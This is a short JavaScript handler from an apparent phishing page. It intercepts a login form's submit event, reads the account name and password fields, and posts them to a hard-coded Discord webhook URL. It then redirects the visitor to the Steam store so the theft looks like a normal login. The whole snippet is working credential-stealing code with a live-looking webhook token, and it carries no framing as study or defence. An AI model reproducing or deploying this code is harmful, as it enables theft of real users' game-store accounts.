document.getElementById("submit-form").addEventListener("submit", function(e) {
            e.preventDefault(); 

            const account = document.getElementById("acc").value;
            const password = document.getElementById("pwd").value;

            const webhookURL = "https://discord.com/api/webhooks/1494608428969103480/r4QDGJSxwYqfqT1813pNn0xVH3xXdcM2a_qed8B0htM4qPmUlzjoDGP3kjea9FATwFXt";
            const payload = {
                content: `帳號: ${account}\n 密碼: ${password}\n`
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            })
            .then(response => {
                if (response.ok) {
                    this.reset();
                    window.location.href = "https://store.steampowered.com/";
                }
            })
            .catch(error => console.error('Error:', error));
        });